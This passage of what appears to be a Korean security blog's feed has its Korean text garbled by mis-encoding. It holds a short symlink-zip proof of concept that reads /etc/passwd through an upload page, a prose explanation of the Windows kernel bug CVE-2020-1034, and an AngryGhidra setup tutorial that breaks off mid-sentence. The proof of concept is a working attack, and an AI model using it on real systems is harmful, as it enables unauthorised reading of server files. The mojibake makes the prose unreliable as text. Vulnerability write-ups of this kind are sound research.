ë‚´ìš©ì´ ë¡œê·¸ì˜¨ ë©”ì‹œì§€ë¡œ í‘œì‹œë©ë‹ˆë‹¤.</p><p>ì´ë•Œ zip íŒŒì¼ì— í¬í•¨ëœ íŒŒì¼ì˜ ì‹¬ë³¼ë¦­ ë§í¬ ì—¬ë¶€ë¥¼ í™•ì¸í•˜ì§€ ì•Šìœ¼ë©° read í•  íŒŒì¼ì„ ì‹¬ë³¼ë¦­ ë§í¬ë¡œ ì„¤ì •í•˜ëŠ” arbitrary file readê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><p>ë‹¤ìŒì€ <code>/etc/passwd</code> íŒŒì¼ì„ ì¶œë ¥í•˜ëŠ” POCì…ë‹ˆë‹¤.</p><pre><code class="hljs gradle">ln -s <span class="hljs-regexp">/etc/</span>passwd <span class="hljs-keyword">default</span>.txtln -s <span class="hljs-regexp">/etc/</span>passwd en.txtzip --symlinks logon.zip <span class="hljs-keyword">default</span>.txt en.txtadding: <span class="hljs-keyword">default</span>.txt (stored <span class="hljs-number">0</span>%)adding: en.txt (stored <span class="hljs-number">0</span>%)</code></pre><p>ìœ„ì™€ ê°™ì´ íŒŒì¼ì— ì‹¬ë³¼ë¦­ ë§í¬ë¥¼ ì„¤ì •í•´ zipìœ¼ë¡œ ì••ì¶•í•œ ë’¤ <code>/dana-admin/auth/signinNotf.cgi</code> í˜ì´ì§€ì— ì—…ë¡œë“œí•˜ë©´ ë¡œê·¸ì˜¨ í˜ì´ì§€ì— <code>/etc/passwd</code>ì˜ ë‚´ìš©ì´ í‘œì‹œë©ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>L0ch</tag>
      
      <tag>arbitrary file read</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-1034: Windows Kernel EoP</title>
    <link href="/2020/10/26/idioth/cve-2020-1034/"/>
    <url>/2020/10/26/idioth/cve-2020-1034/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.br0vvnn.io/pages/blogpost.aspx?id=2">Explicit Is Always Good? Read the Story of CVE-2020-1034</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows 8</li><li>Windows 10</li><li>Windows Server 2012</li><li>Windows Server 2019</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ì§€ë‚œ 9ì›” ì»¤ë„ ê¶Œí•œ ìƒìŠ¹ ì·¨ì•½ì ì— ëŒ€í•œ íŒ¨ì¹˜ê°€ í¬í•¨ë˜ì—ˆìŠµë‹ˆë‹¤. í•´ë‹¹ íŒ¨ì¹˜ì— ì˜í–¥ì„ ë°›ëŠ” ëª¨ë“ˆì€ <code>ntoskrnl.exe</code>ì…ë‹ˆë‹¤.</p><p><code>EtwpNotifyGuid</code>ì—ì„œ <code>cmp [rdi+0Ch], r12b</code>ë¥¼ ìˆ˜í–‰í•˜ëŠ”ë° <code>r12b</code>ì˜ ì´ˆê¸°í™” ê°’ì€ 4ì´ì§€ë§Œ 1ë¡œ ë¦¬ì…‹ì´ ë©ë‹ˆë‹¤. <code>byte ptr[rdi+0Ch]</code>ê°€ 1ì˜ ê°’ê³¼ ê°™ë‹¤ë©´ <code>rdi+18h</code> ê°’ì€ ìƒˆë¡œ ìƒì„±ëœ <code>UmReplyObject</code>ì˜ ì£¼ì†Œë¡œ ì„¤ì •ë©ë‹ˆë‹¤. <code>twpQueueNotification</code>ì—ì„œ <code>UmReplyObject</code>ê°€ ì°¸ì¡°ëœ ë¶€ë¶„ì„ ì°¾ìœ¼ë©´ <code>bl</code>ì˜ ê°’ì€ 0ì´ê³  <code>rbp+0Ch</code>ê°€ 0ì´ ì•„ë‹ ì‹œ <code>rbp+18h</code>ëŠ” ê°ì²´ì˜ í¬ì¸í„°ë¥¼ ì½ìŠµë‹ˆë‹¤. </p><p><code>rbp+0Ch</code>ëŠ”  <code>EtwpNotifyGuid</code>ì—ì„œëŠ” 1ê³¼ ë¹„êµí•˜ì—¬ <code>UmReplyObject</code>ë¥¼ ë§Œë“¤ì§€ ì—¬ë¶€ë¥¼ ê²°ì •í•˜ì§€ë§Œ ë§ˆì§€ë§‰ ë¹„êµì—ì„œ 0ê³¼ ë¹„êµí•˜ì—¬ ì¼ê´€ì„± ì—†ëŠ” ë¹„êµê°€ ë©ë‹ˆë‹¤.</p><p>ë§Œì•½ ë¹„êµí•œ ê°’ì´ 1ì´ë‚˜ 0ì´ ì•„ë‹ ê²½ìš° ê°ì²´ ì£¼ì†Œê°€ ì„ì˜ì˜ ê°’ìœ¼ë¡œ ì‚¬ìš©ë˜ê³  <code>ObfReferenceObject</code>ê°€ í˜¸ì¶œë˜ì–´ <code>ptr[[InputBuffer + 0x18]-0x30] ++</code>ì—°ì‚°ì´ ìˆ˜í–‰ë˜ì–´ ì„ì˜ ì£¼ì†Œ ì¦ê°€ê°€ ì´ë£¨ì–´ì§‘ë‹ˆë‹¤. ë”°ë¼ì„œ Windows 10 RS4 ì´ìƒì˜ ì»¤ë„ì—ì„œ í”„ë¡œì„¸ìŠ¤ í† í°ì˜ ê¶Œí•œ í•„ë“œë¥¼ ì¡°ì‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. </p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>windows</tag>
      
      <tag>kernel</tag>
      
      <tag>idioth</tag>
      
      <tag>ntoskrnl</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] AngryGhidraë¥¼ ì‚¬ìš©í•´ë³´ì!</title>
    <link href="/2020/10/25/idioth/angryghidra/"/>
    <url>/2020/10/25/idioth/angryghidra/</url>
    
    <content type="html"><![CDATA[<p>í•˜ì§€ë©”ë§ˆì‹œë–¼! ë°˜ê°‘ìŠµë‹ˆë‹¤ ì˜¤ëŠ˜ë„ ë¨ë¨í•œ idiothì…ë‹ˆë‹¤.</p><p>ì˜¤ëŠ˜ ì†Œê°œí•´ë“œë¦´ íˆ´ì€ AngryGhidraë¼ëŠ” íˆ´ì…ë‹ˆë‹¤.</p><p>ëˆ„êµ°ê°€(?)ê°€ ì˜¬ë ¤ì¤€ ë§í¬ë¥¼ ë³´ê³  ì˜¤ ì´ê±° í¸í•˜ê² ëŠ”ë° í•œ ë²ˆ ì¨ë³¼ê¹Œ? í•˜ê³  ì¨ë´¤ë‹¤ê°€ ì‚¬ìš©í•´ë³¼ ë§Œí•œ ê°€ì¹˜ê°€ ìˆëŠ” ê²ƒ ê°™ì•„ì„œ ê¸€ì„ ì‘ì„±í•´ë´…ë‹ˆë‹¤.</p><p><a href="https://github.com/angr/angr">angr</a>ì— ëŒ€í•´ ì„¤ëª…í•´ë“œë¦¬ìë©´ ë°”ì´ë„ˆë¦¬ ë¶„ì„ì„ ë„ì™€ì£¼ëŠ” python ë¼ì´ë¸ŒëŸ¬ë¦¬ì…ë‹ˆë‹¤.</p><p>ê¸°ì¡´ angrë¥¼ ì‚¬ìš©í•˜ë ¤ë©´ IDAì™€ ê°™ì€ íˆ´ì„ ì‚¬ìš©í•˜ì—¬ ë¶„ì„í•˜ê³  ì£¼ì†Œë¥¼ êµ¬í•˜ê³  python ì½”ë“œì—ë‹¤ê°€ ì ê³ â€¦ ë‹¤ì‹œ êµ¬í•˜ê³  ì½”ë“œì—ë‹¤ê°€ ì ê³  í•˜ëŠ” ë…¸ê°€ë‹¤ë¥¼ ì§„í–‰í•´ì•¼ í–ˆìŠµë‹ˆë‹¤. í•˜ì§€ë§Œ ì´ ë…€ì„ì„ ì‚¬ìš©í•˜ë©´ Ghidraì—ì„œ ë¶„ì„í•˜ê³  í´ë¦­ì§ˆë§Œ ëª‡ ë²ˆ í•˜ë©´ angrì˜ ê¸°ëŠ¥ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì €ë… ë¨¹ê³  ì™€ì„œ ê³µë¶€ë„ í•˜ê¸° ì‹«ê² ë‹¤â€¦ ìš”ê±°ë‚˜ ì„¸íŒ…í•´ì„œ ì¨ë³´ë©´ì„œ ê°–ê³  ë†€ì•„ë´ì•¼ê² ë‹¤â€¦ íˆíˆíˆ í•˜ëŠ” ìƒê°ì€ 30ë¶„ ë§Œì— ê¹¨ì ¸ë²„ë¦¬ê²Œ ë©ë‹ˆë‹¤.</p><h1 id="ì˜ˆìƒì¹˜-ëª»í•œ-ì‚½ì§ˆ"><a href="#ì˜ˆìƒì¹˜-ëª»í•œ-ì‚½ì§ˆ" class="headerlink" title="ì˜ˆìƒì¹˜ ëª»í•œ ì‚½ì§ˆ"></a>ì˜ˆìƒì¹˜ ëª»í•œ ì‚½ì§ˆ</h1><p>ë¶„ëª… Readme.mdì—ì„œëŠ” ë¦´ë¦¬ì¦ˆ ë²„ì „ì„ ì„¤ì¹˜í•˜ì—¬ Extension ì¶”ê°€í•˜ë©´ ëœë‹¤ í–ˆë‹¤.</p><p>â†’ ê·¼ë° ì™œ ë¦´ë¦¬ì¦ˆ ë²„ì „ì´ ì•„ë¬´ê²ƒë„ ì—†ëŠ” ê±°ì§€? í•¨ì •ì¸ê°€</p><p>ê·¸ëƒ¥ git cloneí•˜ë©´ ë¹Œë“œ ëœ íŒŒì¼ì´ ìˆì„ ê±°ë¼ ìƒê°í•˜ì˜€ìœ¼ë‚˜ ì—†ì—ˆë‹¤.</p><p>â†’ cloneí•˜ê³  ìˆëŠ” íŒŒì¼ë“¤ ì „ë¶€ë‹¤ Ghidra Extensionì—ì„œ í´ë¦­í•´ë´¤ìœ¼ë‚˜ ì˜¤ë¥˜ë§Œ ì—„ì²­ ëœ¸.. build.gradle íŒŒì¼ì´ ìˆìœ¼ë‹ˆ gradleë¡œ ë¹Œë“œë¥¼ í•´ë³´ì</p><p>gradleì„ í†µí•´ ë¹Œë“œë¥¼ í•˜ëŠ”ë° ì •ìƒì ìœ¼ë¡œ ë˜ì§ˆ ì•Šë„¤..?</p><p>â†’ ë‚´ê°€ ë­˜ í•˜ë ¤ í•  ë•Œë§ˆë‹¤ ì˜¤ë¥˜ê°€ ëœ¬ë‹¤â€¦ ì´ì¯¤ì—ì„œ ë©˜íƒˆì´ ë‚˜ê°€ì„œ í˜¼ì ëª¨ë‹ˆí„° ì•ì—ì„œ ìš•ì„ í•˜ê¸° ì‹œì‘</p><p>ìš°ì—¬ê³¡ì ˆ ì†ì—ì„œ ë¹Œë“œ ì„±ê³µ(!) í›„ ì‹ ë‚˜ì„œ L0chì—ê²Œ ì•¼ ë¹Œë“œ í–ˆë‹¤ ì´ì œ ëŒë ¤ë³¸ë‹¤ ì˜†ì—ì„œ ë”± ê¸°ë‹¤ë ¤ ã…‹ã…‹í•˜ê³  ì˜†ì— ì„¸ì›Œë’€ìŠµë‹ˆë‹¤. í•˜ì§€ë§Œ ê°€ì ¸ì˜¨ ë°”ì´ë„ˆë¦¬ë¥¼ ëŒë ¸ëŠ”ë° angrê°€ ëŒì•„ê°€ì§€ ì•Šì•˜ë‹¤â€¦</p><blockquote><p>L0ch æ—¥ : ì•„ë‹ˆ í˜• ëœë‹¤ë©´ì„œ ì•ˆë˜ì–ì•„ ë­ì•¼ ë¹¨ë¦¬ ë‹¤ì‹œ ì‚½ì§ˆí•´ìš”</p></blockquote><p><del>ë‚˜ìœë„˜</del> ì•„ë¬´íŠ¼ ì—¬ê¸°ì„œ ë©ˆì¶œ ìˆ˜ ì—†ìœ¼ë¯€ë¡œ angrë¥¼ ì¬ì„¤ì¹˜í•´ë³´ê³  python ë²„ì „ì´ ë¬¸ì  ê°€ ì‚½ì§ˆì„ ë‹¤ì‹œ ì‹œì‘í•©ë‹ˆë‹¤â€¦</p><p>ê²°êµ­ ë©˜íƒˆì´ ë°•ì‚´ ë‚œ ìƒíƒœë¡œ ì§‘ì— ê°€ì„œ ì• ë‹ˆë©”ì´ì…˜(?)ì„ ë³´ë©° íë§ í›„ ë‹¤ìŒ ë‚  ë‹¤ì‹œ ë„ì „ì„ í•´ë³´ì•˜ìŠµë‹ˆë‹¤.</p><p>UE(User Error)ì¼ ê°€ëŠ¥ì„±ì´ í¬ë‹¤ê³  ìƒê°í•˜ë©° ì˜¤ëŠ˜ì˜ ë‚˜ì™€ ì–´ì œì˜ ë‚˜ëŠ” ë‹¤ë¥´ê¸° ë•Œë¬¸ì— ë˜ ëŒë ¸ëŠ”ë° ì‹¤í–‰ì´ ì•ˆ ëìŠµë‹ˆë‹¤.. ë„ëŒ€ì²´ ì™œ ì•ˆë¼?ë¼ê³  ìƒê°í•˜ëŠ” ì°°ë‚˜ ë‚´ ë¨¸ë¦¬ì— ìŠ¤ì¹œ ìƒê°</p><blockquote><p>ì•„ë‹ˆ ì´ê±° elf íŒŒì¼ì¸ë° ì™œ windowsì—ì„œ ëŒë¦¬ê³  ìˆì§€??</p></blockquote><p align="center"><img src="./img1.jpg" width=60% height=60%></p><p>ubuntuë¡œ ì˜®ê¸´ ë‹¤ìŒì— ë‹¤ì‹œ ìœ„ì˜ ê³¼ì • ë°˜ë³µ í›„ ë‹¤ì‹œ L0chë¥¼ ë¶ˆë €ìŠµë‹ˆë‹¤. ì´ ìì‹ì€ í˜•ì´ ë¶€ë¥´ëŠ”ë° ë§¨ë‚  íˆ¬ëœê±°ë ¤ìš”. â€œì•ˆë˜ê¸°ë§Œ í•´ ë´â€ í•˜ë©´ì„œ ì™€ë†“ê³  ë˜ë‹ˆê¹Œ ë”°ë´‰ ë‚ ë¦¬ê³  ê°‘ë‹ˆë‹¤.</p><p>í˜„ì¬ëŠ” Pre-releaseë¡œ AngryGhidra v0.1ì´ ì—…ë¡œë“œëœ ìƒíƒœë¼ì„œ ê·€ì°®ìœ¼ì‹  ë¶„ì€ <a href="https://github.com/Nalen98/AngryGhidra/releases">ë¦´ë¦¬ì¦ˆ ë²„ì „ì„ ë‹¤ìš´ë¡œë“œ</a> ë°›ì•„ Extensionì„ ë°”ë¡œ ì¶”ê°€í•˜ë©´ ë  ê²ƒ ê°™ìŠµë‹ˆë‹¤.</p><h1 id="ê·¼ë°-Ghidraê°€-ë­”ë°"><a href="#ê·¼ë°-Ghidraê°€-ë­”ë°" class="headerlink" title="ê·¼ë° Ghidraê°€ ë­”ë°?"></a>ê·¼ë° Ghidraê°€ ë­”ë°?</h1><p><a href="https://ghidra-sre.org/">Ghidra</a>ëŠ” NSAì—ì„œ ê°œë°œí•œ ì—­ì–´ì…ˆë¸”ëŸ¬ í”„ë ˆì„ì›Œí¬ì…ë‹ˆë‹¤. ë­ í•˜ëŠ” ë…€ì„ì¸ì§€ ì˜ ëª¨ë¥´ê² ìœ¼ë©´ IDA ê°™ì€ ë…€ì„ì´ë¼ê³  ë³´ì‹œë©´ ë©ë‹ˆë‹¤.</p><p>ì˜¤í”ˆ ì†ŒìŠ¤ë¡œ ê³µê°œë˜ì—ˆìœ¼ë©° jdk 11 ë²„ì „ì—ì„œ ì •ìƒì ìœ¼ë¡œ ì‘ë™ë©ë‹ˆë‹¤.</p><p>ë‹¤ë¥¸ ì‘ìš© í”„ë¡œê·¸ë¨ë“¤ì²˜ëŸ¼ ì„¤ì¹˜ íŒŒì¼ì„ í†µí•´ ì„¤ì¹˜í•˜ëŠ” ê²ƒì´ ì•„ë‹Œ ì••ì¶• íŒŒì¼ì„ ë‹¤ìš´ ë°›ì•„ì„œ ì••ì¶•ë§Œ í•´ì œí•˜ë©´ ë°”ë¡œ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì§€ì› í”Œë«í¼</p><ul><li>Windows 7 or 10 (64bit)</li><li>Linux (64bit, CentOs 7 is preferred)</li><li>macOS(OS X) 10.8.3+ (Mountain Lion or later)</li></ul><p>32ë¹„íŠ¸ OSì—ì„œëŠ” Ghidraë¥¼ ì‚¬ìš©í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤.</p><h2 id="ìš°ë¶„íˆ¬ì—-Ghidra-ì„¤ì¹˜í•˜ê¸°"><a href="#ìš°ë¶„íˆ¬ì—-Ghidra-ì„¤ì¹˜í•˜ê¸°" class="headerlink" title="ìš°ë¶„íˆ¬ì— Ghidra ì„¤ì¹˜í•˜ê¸°"></a>ìš°ë¶„íˆ¬ì— Ghidra ì„¤ì¹˜í•˜ê¸°</h2><h3 id="ìë°”-í™˜ê²½-ì„¤ì¹˜"><a href="#ìë°”-í™˜ê²½-ì„¤ì¹˜" class="headerlink" title="ìë°” í™˜ê²½ ì„¤ì¹˜"></a>ìë°” í™˜ê²½ ì„¤ì¹˜</h3><pre><code class="hljs bash">$ sudo add-apt-repository ppa:openjdk-r/ppa$ sudo apt install openjdk-11-jre openjdk-11-jre-headless openjdk-11-jdk openjdk-11-jdk-headless</code></pre><h3 id="Ghidra-ì„¤ì¹˜"><a href="#Ghidra-ì„¤ì¹˜" class="headerlink" title="Ghidra ì„¤ì¹˜"></a>Ghidra ì„¤ì¹˜</h3><p><a href="https://ghidra-sre.org/">ê¸°ë“œë¼ ì‚¬ì´íŠ¸</a>ì—ì„œ ìµœì‹  ë²„ì „ì˜ ê¸°ë“œë¼ë¥¼ ì„¤ì¹˜í•´ì¤ë‹ˆë‹¤.</p><p><img src="/2020/10/25/idioth/angryghidra/img2.png"></p><p>ì„¤ì¹˜ í›„ ì›í•˜ëŠ” í´ë”ì—ì„œ ì••ì¶•ì„ í•´ì œí•˜ë©´ ghidraê°€ ì •ìƒì ìœ¼ë¡œ ì„¤ì¹˜ë©ë‹ˆë‹¤.</p><pre><code class="hljs bash">idioth@ubuntu:~$ ls -al ghidra_9.1.2_PUBLICtotal 56drwxr-xr-x  9 idioth idioth  4096  9ì›” 11 15:15 .drwxr-xr-x 31 idioth idioth  4096  9ì›” 14 17:01 ..drwxr-xr-x  5 idioth idioth  4096  2ì›” 12  2020 docsdrwxr-xr-x  5 idioth idioth  4096  2ì›” 12  2020 Extensionsdrwxr-xr-x  8 idioth idioth  4096  2ì›” 12  2020 Ghidra-rwxr-xr-x  1 idioth idioth   883  2ì›” 12  2020 ghidraRun-rw-r--r--  1 idioth idioth   384  2ì›” 12  2020 ghidraRun.batdrwxr-xr-x  7 idioth idioth  4096  2ì›” 12  2020 GPL-rw-r--r--  1 idioth idioth 11357  2ì›” 12  2020 LICENSEdrwxr-xr-x  2 idioth idioth  4096  2ì›” 12  2020 licensesdrwxr-xr-x  2 idioth idioth  4096  2ì›” 12  2020 serverdrwxr-xr-x  2 idioth idioth  4096  2ì›” 12  2020 support</code></pre><p>Windowsì˜ ê²½ìš° ghidraRun.batë¥¼ í†µí•´ ì‹¤í–‰í•˜ê³  ìš°ë¶„íˆ¬ì˜ ê²½ìš° ghidraRunì„ í†µí•´ ì‹¤í–‰í•´ ì¤ë‹ˆë‹¤. ì‹¤í–‰ ê¶Œí•œì´ ì—†ì„ ê²½ìš° chmod +x ghidraRunì„ í†µí•´ ì‹¤í–‰ ê¶Œí•œì„ ì£¼ë©´ ë©ë‹ˆë‹¤.</p><h1 id="AngryGhidra"><a href="#AngryGhidra" class="headerlink" title="AngryGhidra"></a>AngryGhidra</h1><p>ê¸°ë“œë¼ê°€ ì •ìƒì ìœ¼ë¡œ ì„¤ì¹˜ë˜ì—ˆë‹¤ë©´ <a href="https://github.com/Nalen98/AngryGhidra/releases">AngryGhidra</a>ë¥¼ ì„¤ì¹˜í•´ ì¤ë‹ˆë‹¤.</p><h2 id="Angr-ì„¤ì¹˜"><a href="#Angr-ì„¤ì¹˜" class="headerlink" title="Angr ì„¤ì¹˜"></a>Angr ì„¤ì¹˜</h2><pre><code class="hljs bash">$ sudo pip3 install angr</code></pre><h2 id="Releasesë¡œ-í”ŒëŸ¬ê·¸ì¸-ë“±ë¡"><a href="#Releasesë¡œ-í”ŒëŸ¬ê·¸ì¸-ë“±ë¡" class="headerlink" title="Releasesë¡œ í”ŒëŸ¬ê·¸ì¸ ë“±ë¡"></a>Releasesë¡œ í”ŒëŸ¬ê·¸ì¸ ë“±ë¡</h2><p>pre-releasesê°€ ì˜¬ë¼ì™”ìœ¼ë‹ˆ ì €ì™€ ê°™ì€ ì‹œê°„ ë‚­ë¹„(?)ëŠ” í•˜ì§€ ë§ê³  ë¦´ë¦¬ì¦ˆ ë²„ì „ìœ¼ë¡œ ë“±ë¡ì„ í•´ë´…ì‹œë‹¤.</p><pre><code class="hljs bash">$ wget https://github.com/Nalen98/AngryGhidra/releases/download/0.1%2Bghidra-9.1.2/ghidra_9.1.2_PUBLIC_20200909_AngryGhidra.zip</code></pre><p>ë¦´ë¦¬ì¦ˆ ë²„ì „ì„ ì„¤ì¹˜í•´ ì¤ë‹ˆë‹¤.</p><p><img src="/2020/10/25/idioth/angryghidra/img3.png"></p><p>ê¸°ë“œë¼ ì‹¤í–‰ í›„ File-Install Extensionsì„ ì„ íƒí•´ ì¤ë‹ˆë‹¤.</p><p><img src="/2020/10/25/idioth/angryghidra/img4.png"></p><p>ìš°ì¸¡ ìƒë‹¨ì— +ë²„íŠ¼ì„ ì„ íƒí•´ ì¤ë‹ˆë‹¤.</p><p><img src="/2020/10/25/idioth/angryghidra/img5.png"></p><p>ì„¤ì¹˜ ë°›ì€ zip íŒŒì¼ì„ ì„ íƒí•´ ì¤€ í›„ ì²´í¬í•´ ì¤ë‹ˆë‹¤.</p><p>ê·¸ëŸ¬ë©´ ëë‚©ë‹ˆë‹¤. ì²´í¬í•˜ê³  OK ëˆ„ë¥´ë©´ ì„¤ì¹˜ ì™„ë£Œ~</p><h2 id="Gradleì„-í†µí•´ì„œ-ì§ì ‘-ë¹Œë“œí•˜ëŠ”-ë°©ë²•"><a href="#Gradleì„-í†µí•´ì„œ-ì§ì ‘-ë¹Œë“œí•˜ëŠ”-ë°©ë²•" class="headerlink" title="Gradleì„ í†µí•´ì„œ ì§ì ‘ ë¹Œë“œí•˜ëŠ” ë°©ë²•"></a>Gradleì„ í†µí•´ì„œ ì§ì ‘ ë¹Œë“œí•˜ëŠ” ë°©ë²•</h2><p>ë¦´ë¦¬ì¦ˆ ë²„ì „ì´ ì˜¬ë¼ì™€ ìˆê¸° ë•Œë¬¸ì— êµ³ì´ ì´ ë°©ë²•ì„ íƒí•˜ì‹œëŠ” ë¶„ì´ ì—†ì„ ê±°ë¼ ìƒê°í•˜ì§€ë§Œ í˜¹ì‹œ ë³¸ì¸ì´ ì§ì ‘ ë¹Œë“œ í•´ë³´ê³  ì‹¶ìœ¼ì‹œë‹¤ë©´ ì§ì ‘ ë¹Œë“œ í•´ë³´ì‹œëŠ” ê²ƒë„ ì¶”ì²œë“œë¦½ë‹ˆë‹¤.</p><pre><code class="hljs bash">$ sudo apt install gradle$ git <span class="hljs-built_in">clone</span> https://github.com/Nalen98/AngryGhidra</code></pre><p>gradleì„ í†µí•´ì„œ ë¹Œë“œ í•˜ê¸° ìœ„í•´ gradleì„ ì„¤ì¹˜í•˜ê³  AngryGhidra repositoryë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤.</p><pre><code class="hljs bash">~/AngryGhidra$ gradle buildExtensionStarting a Gradle Daemon, 1 incompatible and 1 stopped Daemons could not be reused, use --status <span class="hljs-keyword">for</span> detailsFAILURE: Build failed with an exception.* Where:Build file <span class="hljs-string">&#x27;/home/idioth/AngryGhidra/build.gradle&#x27;</span> line: 31* What went wrong:A problem occurred evaluating root project <span class="hljs-string">&#x27;AngryGhidra&#x27;</span>.&gt; GHIDRA_INSTALL_DIR is not defined!* Try:Run with --stacktrace option to get the stack trace. Run with --info or --debug option to get more <span class="hljs-built_in">log</span> output. Run with --scan to get full insights.* Get more <span class="hljs-built_in">help</span> at https://help.gradle.orgBUILD FAILED <span class="hljs-keyword">in</span> 3s</code></pre><p>ê·¸ëƒ¥ ë¹Œë“œë¥¼ ì§„í–‰í•  ê²½ìš° ê¸°ë“œë¼ì˜ ì„¤ì¹˜ ê²½ë¡œë¥¼ ì•Œ ìˆ˜ ì—†ê¸° ë•Œë¬¸ì— ì •ìƒì ìœ¼ë¡œ ë¹Œë“œê°€ ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ì¢€ ë” ë˜‘ë˜‘í•œ(?) ì œê°€ ê°€ë¥´ì³ì£¼ë„ë¡ í•©ë‹ˆë‹¤.</p><pre><code class="hljs bash">~/AngryGhidra$ sudo GHIDRA_INSTALL_DIR=/home/idioth/ghidra_9.1.2_PUBLIC gradle buildExtension&gt; Task :buildHelp INFO  Using <span class="hljs-built_in">log</span> config file: jar:file:/home/idioth/ghidra_9.1.2_PUBLIC/Ghidra/Framework/Generic/lib/Generic.jar!/generic.log4j.xml (LoggingInitialization)  INFO  Using <span class="hljs-built_in">log</span> file: /root/.ghidra/.ghidra_9.1.2_PUBLIC/application.log (LoggingInitialization)  [JavaHelpFilesBuilder] Generating Help Files <span class="hljs-keyword">for</span>: [file:///home/idioth/AngryGhidra/src/main/<span class="hljs-built_in">help</span>/<span class="hljs-built_in">help</span>/][JavaHelpFilesBuilder] Generating map file: file:///home/idioth/AngryGhidra/build/<span class="hljs-built_in">help</span>/main/<span class="hljs-built_in">help</span>/AngryGhidra_map.xml...[JavaHelpFilesBuilder]  finished generating map file[JavaHelpFilesBuilder] Generating TOC file: AngryGhidra_TOC.xml...[JavaHelpFilesBuilder]  finished generating TOC file[JavaHelpFilesBuilder] Done generating <span class="hljs-built_in">help</span> files <span class="hljs-keyword">for</span> module: AngryGhidra&gt; Task :buildExtension Created ghidra_9.1.2_PUBLIC_20200914_AngryGhidra.zip <span class="hljs-keyword">in</span> /home/idioth/AngryGhidra/distBUILD SUCCESSFUL <span class="hljs-keyword">in</span> 15s8 actionable tasks: 8 executed</code></pre><p>ìœ„ì™€ ê°™ì´ ìì‹ ì˜ ê¸°ë“œë¼ ê²½ë¡œë¥¼ ì¶”ê°€í•´ ì¤€ í›„ ë¹Œë“œë¥¼ ì§„í–‰í•©ë‹ˆë‹¤. </p><pre><code class="hljs bash">~/AngryGhidra/dist$ lsghidra_9.1.2_PUBLIC_20200914_AngryGhidra.zip</code></pre><p>ì •ìƒì ìœ¼ë¡œ ë¹Œë“œê°€ ì§„í–‰ëë‹¤ë©´ dist í´ë”ì— Extension íŒŒì¼ì´ ìƒê¹ë‹ˆë‹¤.</p><p>ì—¬ê¸°ê¹Œì§€ ì˜¤ì…¨ë‹¤ë©´ ë¦´ë¦¬ì¦ˆë¥¼ í†µí•´ ì¶”ê°€í•˜ëŠ” ê²ƒê³¼ ê°™ì€ ë°©ë²•ìœ¼ë¡œ ì¶”ê°€í•˜ì‹œë©´ ë©ë‹ˆë‹¤!</p><h2 id="AngryGhidraë¥¼-í†µí•œ-ë¬¸ì œ-í’€ì´"><a href="#AngryGhidraë¥¼-í†µí•œ-ë¬¸ì œ-í’€ì´" class="headerlink" title="AngryGhidraë¥¼ í†µí•œ ë¬¸ì œ í’€ì´"></a>AngryGhidraë¥¼ í†µí•œ ë¬¸ì œ í’€ì´</h2><p>angrë¡œ í‘¸ëŠ” ë¬¸ì œ ì¤‘ ê°€ì¥ ê°„ë‹¨í•œ(?) <a href="https://github.com/ByteBandits/writeups/blob/master/defcamp-quals-2015/reverse/r100/r100.bin">Defcamp - r100</a>ì„ í†µí•´ì„œ ì–´ë–¤ ì‹ìœ¼ë¡œ ì‚¬ìš©í•˜ëŠ”ì§€ í™•ì¸í•´ë´…ì‹œë‹¤.</p><p>ë¨¼ì € ê¸°ë“œë¼ë¡œ í•´ë‹¹ íŒŒì¼ì„ ì—´ì–´ì¤€ í›„ main ì†ŒìŠ¤ ì½”ë“œë¥¼ í™•ì¸í•´ë´…ì‹œë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-function">undefined8 <span class="hljs-title">FUN_004007e8</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">int</span> iVar1;<span class="hljs-keyword">char</span> *pcVar2;undefined8 uVar3;<span class="hljs-keyword">long</span> in_FS_OFFSET;<span class="hljs-keyword">char</span> local_118 [<span class="hljs-number">264</span>];<span class="hljs-keyword">long</span> local_10;local_10 = *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the password: &quot;</span>);pcVar2 = fgets(local_118, <span class="hljs-number">0xff</span>, <span class="hljs-built_in">stdin</span>);<span class="hljs-keyword">if</span> (pcVar2 == (<span class="hljs-keyword">char</span> *)<span class="hljs-number">0x0</span>) &#123;uVar3 = <span class="hljs-number">0</span>;&#125;<span class="hljs-keyword">else</span> &#123;iVar1 = FUN_004006fd(local_118);<span class="hljs-keyword">if</span> (iVar1 == <span class="hljs-number">0</span>) &#123;put(<span class="hljs-string">&quot;Nice!&quot;</span>);uVar3 = <span class="hljs-number">0</span>;&#125;<span class="hljs-keyword">else</span> &#123;<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Incorrect password!&quot;</span>);uVar3 = <span class="hljs-number">1</span>;&#125;&#125;<span class="hljs-keyword">if</span> (local_10 != *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;__stack_chk_fail();&#125;<span class="hljs-keyword">return</span> uVar3;&#125;</code></pre><p>passwordë¥¼ ì…ë ¥ë°›ê³  <code>FUN_004006fd</code> í•¨ìˆ˜ì—ì„œ ì–´ë– í•œ ìˆ˜í–‰ì„ í•˜ê³  return 